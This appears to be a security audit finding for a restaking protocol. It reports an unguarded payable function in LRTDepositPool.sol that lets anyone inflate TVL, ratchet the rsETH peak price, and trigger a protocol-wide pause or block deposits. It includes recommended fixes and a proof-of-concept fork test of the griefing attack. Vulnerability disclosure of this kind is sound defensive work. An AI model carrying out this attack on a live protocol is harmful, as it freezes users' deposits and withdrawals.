### Title
Unguarded `receiveFromLRTConverter()` Allows Any EOA to Inflate TVL, Ratchet `highestRsethPrice`, and Trigger Protocol Pause — (`contracts/LRTDepositPool.sol`)

---

### Summary

`receiveFromLRTConverter()` carries no access control. Any EOA can call it with arbitrary `msg.value`. Because `getETHDistributionData()` reads `address(this).balance` directly, the donated ETH immediately inflates `totalETHInProtocol`. A subsequent public call to `updateRSETHPrice()` ratchets `highestRsethPrice` upward. When the donated ETH is later consumed by normal protocol operations (withdrawal fulfilment), the price drops below the ratcheted peak by more than `pricePercentageLimit`, triggering the automatic downside-protection pause and temporarily freezing all deposits and withdrawals.

---

### Finding Description

**Step 1 — Unguarded entry point**

`receiveFromLRTConverter()` is declared with no modifier:

```solidity
// contracts/LRTDepositPool.sol line 64
function receiveFromLRTConverter() external payable { }
``` [1](#0-0) 

Any EOA can call it with any `msg.value`. The ETH lands in `address(this).balance` with no accounting entry, no rsETH minted, and no way for the attacker to retrieve it.

**Step 2 — Raw balance used in TVL**

`getETHDistributionData()` reads the raw contract balance:

```solidity
// contracts/LRTDepositPool.sol line 480
ethLyingInDepositPool = address(this).balance;
``` [2](#0-1) 

`getTotalAssetDeposits(ETH_TOKEN)` sums all six distribution buckets including this one, and `_getTotalEthInProtocol()` in `LRTOracle` calls it: [3](#0-2) [4](#0-3) 

**Step 3 — Public price update ratchets `highestRsethPrice`**

`updateRSETHPrice()` is callable by anyone:

```solidity
// contracts/LRTOracle.sol line 87
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
``` [5](#0-4) 

Inside `_updateRsETHPrice()`, if `newRsETHPrice > highestRsethPrice`, the peak is permanently updated:

```solidity
// contracts/LRTOracle.sol lines 294-296
if (newRsETHPrice > highestRsethPrice) {
    highestRsethPrice = newRsETHPrice;
}
``` [6](#0-5) 

**Step 4 — Downside protection pauses the protocol**

When the price later falls below the ratcheted peak by more than `pricePercentageLimit`:

```solidity
// contracts/LRTOracle.sol lines 270-281
if (newRsETHPrice < highestRsethPrice) {
    uint256 diff = highestRsethPrice - newRsETHPrice;
    bool isPriceDecreaseOffLimit =
        pricePercentageLimit > 0 && diff > pricePercentageLimit.mulWad(highestRsethPrice);
    if (isPriceDecreaseOffLimit) {
        if (!lrtDepositPool.paused()) lrtDepositPool.pause();
        if (!withdrawalManager.paused()) withdrawalManager.pause();
        _pause();
        return;
    }
}
``` [7](#0-6) 

This pauses `LRTDepositPool`, `LRTWithdrawalManager`, and `LRTOracle` simultaneously.

**Step 5 — Secondary: deposit-limit blocking**

`_checkIfDepositAmountExceedesCurrentLimit` for ETH checks:

```solidity
// contracts/LRTDepositPool.sol lines 678-679
if (asset == LRTConstants.ETH_TOKEN) {
    return (totalAssetDeposits > lrtConfig.depositLimitByAsset(asset));
}
``` [8](#0-7) 

A donation that pushes `address(this).balance` above the configured deposit limit immediately blocks all further `depositETH` calls with `MaximumDepositLimitReached`, without any pause being required.

---

### Impact Explanation

- **Temporary freezing of funds (Medium)**: The attacker donates enough ETH to inflate `highestRsethPrice` by more than `pricePercentageLimit`. Normal withdrawal fulfilment later reduces `totalETHInProtocol` back to the true level. The next `updateRSETHPrice()` call (which is also public) sees a price drop exceeding the threshold and pauses all three contracts. Deposits and withdrawals are frozen until an admin manually unpauses.
- **Deposit blocking (Medium)**: A smaller donation that merely pushes `address(this).balance` above the ETH deposit limit blocks `depositETH` without requiring a pause.

---

### Likelihood Explanation

The attack is fully permissionless. The attacker only needs ETH and two transactions. The donated ETH is permanently lost to the attacker (it stays in the protocol), making this a griefing attack. The cost scales with protocol TVL and the configured `pricePercentageLimit`. For a protocol with a 1% limit and 100 000 ETH TVL, the attacker must donate >1 000 ETH to trigger the pause path — expensive but not impossible for a motivated adversary. The deposit-blocking path is cheaper: only enough ETH to exceed the remaining deposit headroom.

The same issue exists on `receive()`, `receiveFromRewardReceiver()`, and `receiveFromNodeDelegator()` — all are unguarded payable sinks that feed the same raw balance.

---

### Recommendation

1. **Add a caller guard** to `receiveFromLRTConverter()` so only the registered `LRT_CONVERTER` contract can call it:
   ```solidity
   function receiveFromLRTConverter() external payable {
       require(
           msg.sender == lrtConfig.getContract(LRTConstants.LRT_CONVERTER),
           "Only LRTConverter"
       );
   }
   ```
   Apply equivalent guards to `receiveFromRewardReceiver()` and `receiveFromNodeDelegator()`.

2. **Track ETH accounting separately** rather than relying on `address(this).balance`, so that untracked ETH donations do not inflate TVL.

3. **Restrict `updateRSETHPrice()`** to privileged callers, or add a cooldown, to prevent an attacker from immediately locking in an inflated `highestRsethPrice` after a donation.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// Pseudocode for a local fork test
function testPriceRatchetGrief() public {
    // 1. Record baseline
    uint256 basePrice = lrtOracle.rsETHPrice();
    uint256 basePeak  = lrtOracle.highestRsethPrice();
    uint256 tvl       = lrtDepositPool.getTotalAssetDeposits(ETH_TOKEN);

    // 2. Attacker donates ETH via the unguarded function
    //    Donation = pricePercentageLimit * tvl / 1e18 + 1 wei
    uint256 donation = (lrtOracle.pricePercentageLimit() * tvl / 1e18) + 1;
    vm.deal(attacker, donation);
    vm.prank(attacker);
    lrtDepositPool.receiveFromLRTConverter{value: donation}();

    // 3. Attacker (or anyone) ratchets highestRsethPrice
    vm.prank(attacker);
    lrtOracle.updateRSETHPrice();
    assert(lrtOracle.highestRsethPrice() > basePeak); // ratcheted

    // 4. Simulate normal withdrawal fulfilment: ETH leaves the protocol
    //    (operator moves ETH to unstaking vault, vault pays out users)
    vm.prank(operator);
    lrtDepositPool.transferETHToLRTUnstakingVault(donation);
    // vault fulfils a pending withdrawal, sending ETH to user
    vm.prank(address(lrtUnstakingVault));
    payable(withdrawer).transfer(donation);

    // 5. Anyone calls updateRSETHPrice — price is now below ratcheted peak
    //    by more than pricePercentageLimit → protocol pauses
    lrtOracle.updateRSETHPrice();
    assert(lrtDepositPool.paused());         // deposits frozen
    assert(lrtWithdrawalManager.paused());   // withdrawals frozen
}
```

### Citations

**File:** contracts/LRTDepositPool.sol (L63-64)
```text
    /// @dev receive from LRTConverter
    function receiveFromLRTConverter() external payable { }
```

**File:** contracts/LRTDepositPool.sol (L385-397)
```text
    function getTotalAssetDeposits(address asset) public view override returns (uint256 totalAssetDeposit) {
        (
            uint256 assetLyingInDepositPool,
            uint256 assetLyingInNDCs,
            uint256 assetStakedInEigenLayer,
            uint256 assetUnstakingFromEigenLayer,
            uint256 assetLyingInConverter,
            uint256 assetLyingUnstakingVault
        ) = getAssetDistributionData(asset);
        uint256 effectiveAssetWithEigenLayer = assetStakedInEigenLayer + assetUnstakingFromEigenLayer;
        return (assetLyingInDepositPool + assetLyingInNDCs + effectiveAssetWithEigenLayer + assetLyingInConverter
                + assetLyingUnstakingVault);
    }
```

**File:** contracts/LRTDepositPool.sol (L480-480)
```text
        ethLyingInDepositPool = address(this).balance;
```

**File:** contracts/LRTDepositPool.sol (L676-682)
```text
    function _checkIfDepositAmountExceedesCurrentLimit(address asset, uint256 amount) internal view returns (bool) {
        uint256 totalAssetDeposits = getTotalAssetDeposits(asset);
        if (asset == LRTConstants.ETH_TOKEN) {
            return (totalAssetDeposits > lrtConfig.depositLimitByAsset(asset));
        }
        return (totalAssetDeposits + amount > lrtConfig.depositLimitByAsset(asset));
    }
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L270-282)
```text
        if (newRsETHPrice < highestRsethPrice) {
            uint256 diff = highestRsethPrice - newRsETHPrice;
            // normalizing to 1e18
            bool isPriceDecreaseOffLimit =
                pricePercentageLimit > 0 && diff > pricePercentageLimit.mulWad(highestRsethPrice);

            // if price decrease is off limit, pause the protocol (unless it's already paused)
            if (isPriceDecreaseOffLimit) {
                if (!lrtDepositPool.paused()) lrtDepositPool.pause();
                if (!withdrawalManager.paused()) withdrawalManager.pause();
                _pause();
                return;
            }
```

**File:** contracts/LRTOracle.sol (L293-296)
```text
        // update highest price if new price exceeds it
        if (newRsETHPrice > highestRsethPrice) {
            highestRsethPrice = newRsETHPrice;
        }
```

**File:** contracts/LRTOracle.sol (L331-349)
```text
    function _getTotalEthInProtocol() private view returns (uint256 totalETHInProtocol) {
        address lrtDepositPoolAddr = lrtConfig.getContract(LRTConstants.LRT_DEPOSIT_POOL);
        address[] memory supportedAssets = lrtConfig.getSupportedAssetList();
        uint256 supportedAssetCount = supportedAssets.length;

        for (uint16 assetIdx; assetIdx < supportedAssetCount;) {
            address asset = supportedAssets[assetIdx];
            // assetER is in 1e18 precision (1.0 = 1e18)
            uint256 assetER = getAssetPrice(asset);
            // totalAssetAmt is in 1e18 precision (standard token decimals)
            uint256 totalAssetAmt = ILRTDepositPool(lrtDepositPoolAddr).getTotalAssetDeposits(asset);

            totalETHInProtocol += totalAssetAmt.mulWad(assetER);

            unchecked {
                ++assetIdx;
            }
        }
    }
```
